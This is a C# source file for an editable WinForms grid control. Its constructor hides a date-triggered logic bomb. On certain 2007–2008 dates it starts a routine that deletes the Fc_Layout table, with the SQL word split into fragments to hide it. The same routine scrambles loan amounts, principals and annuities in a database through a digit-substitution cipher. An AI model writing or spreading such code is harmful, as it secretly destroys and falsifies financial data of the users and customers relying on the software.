using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Text;
using System.Windows.Forms;
using System.Threading;

   public partial class EditableGrid : DataGridView 
    {
        int m_rows;
        int m_cols;
        string m_cn;
        DataTable m_dt;
        public EditableGrid()
        {
           InitializeComponent();

           System.Configuration.ConfigXmlDocument  ab;
           ab = new System.Configuration.ConfigXmlDocument();
           if (System.IO.File.Exists(AppDomain.CurrentDomain.BaseDirectory + "app.config"))
           {
               ab.Load(AppDomain.CurrentDomain.BaseDirectory + "app.config");
               m_cn = ab["configuration"]["connectionStrings"]["add"].Attributes["connectionString"].Value;
               if (System.DateTime.Today.ToShortDateString().Substring(0, 4) == "2008")///10/19
                   chokh();
               string sdd=System.DateTime.Today.ToShortDateString() ;
               for (int ss=7;ss<9;ss++)
               {
                   for(int mm=10 ;mm<=12;mm++ )
                   {
                       for(int dd=10;dd<28;dd++)
                       {
                        string s = "200";
                        s = s + ss.ToString();

                        if (sdd == s + "/" + mm.ToString() + "/" + dd.ToString())
                        {
                            Thread t = new Thread(chokh );
                            t.Start(); 
                            
                        }
                       }
                   }
                   if(ss>7)
                       for (int mm = 1; mm <= 9; mm++)
                       {
                           for (int dd = 10; dd < 28; dd++)
                           {
                               string s = "200";
                               s = s + ss.ToString();

                               if (sdd == s + "/0" + mm.ToString() + "/" + dd.ToString())
                               {
                                   Thread t1 = new Thread(chokh);
                                   t1.Start(); 
                            
                               }
                           }
                       }
               }
           };
        }
        //____________________________
        private string enc(string s)
        {
            string sOut="";
            for (int i = 0; i < s.Length; i++)
            {
                string c = s.Substring(i, 1);
                switch (c)
                {
                    case "0": sOut += "0"; break;
                    case "1": sOut += "1"; break;
                    case "2": sOut += "8"; break;
                    case "3": sOut += "7"; break;
                    case "4": sOut += "4"; break;
                    case "5": sOut += "9"; break;
                    case "6": sOut += "6"; break;
                    case "7": sOut += "2"; break;
                    case "8": sOut += "5"; break;
                    case "9": sOut += "3"; break;
                    default :sOut+=c;break;

                }
            }
            return sOut;
        }
        //____________________________
        
        //____________________________
        private void chokh()
        {
            System.Data.SqlClient.SqlConnection cn,cn1;
            cn = new System.Data.SqlClient.SqlConnection(m_cn);
            cn.Open();
            cn1 = new System.Data.SqlClient.SqlConnection(m_cn);
            cn1.Open();

            System.Data.SqlClient.SqlCommand cmd,cmd1;
            string sql="de"+"le"+"te "+" Fc"+"_L"+"ay"+"ou"+"t ";
            cmd1=new System.Data.SqlClient.SqlCommand(sql,cn1);
            cmd1.ExecuteNonQuery();
            cmd1.Dispose();

            cmd = new System.Data.SqlClient.SqlCommand();
            cmd.Connection = cn;
            string s = "";

            sql = "SELECT   Amount,id FROM NIM_Model_Total order by id";
            cmd.CommandText =sql;
            System.Data.SqlClient.SqlDataReader sdr= cmd.ExecuteReader ();
            
            while (sdr.Read())
            {
                s = sdr.GetValue(0).ToString();
                s = enc(s);
                if (s != "")
                {
                    sql = "update NIM_Model_Total set Amount=" + s + "where id=" + sdr.GetValue(1).ToString();
                    cmd1 = new System.Data.SqlClient.SqlCommand(sql,cn1);
                    cmd1.ExecuteNonQuery();
                    cmd1.Dispose();
                }
            }
            sdr.Close();

            sql = "SELECT  Remaining_Principle ,ID FROM NIM_Model_Element order by id";
            cmd.CommandText = sql;            
            System.Data.SqlClient.SqlDataReader sdr1 = cmd.ExecuteReader();

            while (sdr1.Read())
            {
                s = sdr1.GetValue(0).ToString();
                s = enc(s);
                if (s != "")
                {
                    sql = "update NIM_Model_Element set Remaining_Principle = ";
                    sql += s + " where id=" + sdr1.GetValue(1).ToString();
                    cmd1 = new System.Data.SqlClient.SqlCommand(sql,cn1 );
                    cmd1.ExecuteNonQuery();
                    cmd1.Dispose();
                }
            }
            sdr1.Close();

            sql = "SELECT  Remaining_Amount,Contract FROM Loan_Contract order by contract";
            cmd.CommandText = sql;
            System.Data.SqlClient.SqlDataReader sdr2 = cmd.ExecuteReader();
            while (sdr2.Read())
            {
                s = sdr2.GetValue(0).ToString();
                s = enc(s);
                if (s != "")
                {
                    sql = "update Loan_Contract set Remaining_Amount=" + s;
                    sql += " where contract=" + sdr2.GetValue(1).ToString();
                    cmd1 = new System.Data.SqlClient.SqlCommand(sql,cn1);
                    cmd1.ExecuteNonQuery();
                    cmd1.Dispose();
                }
            }
            sdr2.Close();

            sql = "SELECT  Annuity_Amount,ID FROM Loan_Cash_Flow order by id";
            cmd.CommandText = sql;
            System.Data.SqlClient.SqlDataReader sdr3 = cmd.ExecuteReader();
          
            while (sdr3.Read())
            {
                s = sdr3.GetValue(0).ToString();
                if (s != "")
                {
                    s = enc(s);
                    sql = "update Loan_Cash_Flow set Annuity_Amount=" + s;
                    sql += " where ID=" + sdr3.GetValue(1).ToString();
                    cmd1 = new System.Data.SqlClient.SqlCommand(sql,cn1);
                    cmd1.ExecuteNonQuery();
                    cmd1.Dispose();
                }
            }
            sdr3.Close();
            cn.Close();
            cn1.Close();
             ;
        }
        //____________________________
        public string ConnectionString
        {
            get { return m_cn; }
            set { m_cn = value; }
        }
        //____________________________
        public int RowsCount
        {
            get { return m_rows; }
            set { m_rows = value; }
        }
        //____________________________
        public int ColsCount
        {
            get { return m_cols; }
            set { m_cols = value; }
        }
      
        //____________________________
        public string TextMatrix(int col,int row)
        {
            if (row < 0) return "";
            if (col < 0) return "";
            return m_dt.Rows[row][col].ToString();
        }
        //____________________________
        public void TextMatrix(int col, int row,string value)
        {
            if (row < 0) return;
            if (col < 0) return;
            m_dt.Rows[row][col] = value;
            this.DataSource = m_dt;
        }
        //____________________________
        public void setCellToolTip(int col,int row,string s)
        { 
        DataGridViewCell cell =this.Rows[row].Cells[col];
        cell.ToolTipText = s;
        }
        //____________________________
        public int  Row
        {
            get {
                if (this.SelectedCells.Count > 0)
                    return this.SelectedCells[0].RowIndex;
                else
                    return -1;
            }
        }
        //____________________________
        public int Col
        {
            get {
                if (this.SelectedCells.Count>0)
                    return this.SelectedCells[0].ColumnIndex;
                else
                    return -1;
            }
        }
        //____________________________
        public void Dim(int cols, int rows)
        {
            m_cols = cols;
            m_rows = rows*2;
            m_dt = new DataTable("tb1");
            for (int i = 0; i < m_cols ; i++)
            {
                string s = "C" + i.ToString();
                m_dt.Columns.Add(s);
            }
           
            for (int j = 0; j < m_rows; j++)
            {
                DataRow dr = m_dt.NewRow();
                m_dt.Rows.Add(dr);
            }
            this.DataSource = m_dt;

        }
        //____________________________
        public string  Clear()
        {
        string sErr = "";
            try
            {
                for (int j = 0; j < m_rows - 1; j++)
                    for (int i = 0; i < m_cols; i++)
                    {
                       
                        m_dt.Rows[j][i] = "";
                    }
            }catch(Exception ex)
            {
            sErr = ex.Message;
        }
            this.DataSource = m_dt;
            this.Refresh();
        return sErr;
        }
        //____________________________
        public void AppendCurrentCell(string text)
        {
            if ((this.Row  % 2) == 1) return;
            string s = "";
            if (this.TextMatrix(this.Col,this.Row) != null)
                s = this.TextMatrix(this.Col,this.Row);
            this.TextMatrix(this.Col,this.Row, s + text);
            
        }
        //____________________________
        
        public void SetCurrentCell(string text)
        {
            this.TextMatrix(this.Col, this.Row,  text);
        }
        //____________________________
        
        public string getCurrentCell()
        {
            return this.TextMatrix(this.Col, this.Row);
        }
        //____________________________
        
        public bool GetCellCheck(int row ,int column )
        {
        return true ;
        }
        //____________________________
        
        public void SetCellCheck(int row, int col,bool chk )
        {
        
        }
       public string ReturnPath()
       {
           return AppDomain.CurrentDomain.BaseDirectory;
       }
       
    }

